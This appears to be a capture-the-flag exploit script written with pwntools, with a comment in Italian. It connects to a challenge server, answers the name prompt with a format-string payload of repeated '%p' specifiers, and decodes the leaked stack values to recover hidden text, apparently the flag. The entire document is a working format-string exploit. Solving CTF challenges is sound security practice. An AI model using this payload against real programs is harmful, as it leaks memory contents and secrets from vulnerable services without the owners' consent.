#p32 per gli interi
from pwn import *
from Crypto.Util.number import bytes_to_long
context.terminal = ('kgx', '-e')
def main():

    conn = remote('elia.challs.pascalctf.it', 1339)
    
    conn.recvuntil(b"?\n") #What's your name?
    
    conn.sendline(b'%p%p%p%p%p%p%p%p%p%p%p%p%p%p') 

    response = conn.recvline()
    response = response.decode().replace('(nil)', '').split('0x')
    print(response)
    for char in response:
        try:
            print(bytes.fromhex(char).decode()[::-1], end='')
        except:
            pass

    print(f'response: {response}')
    
    conn.interactive()

if __name__ == "__main__":
    main()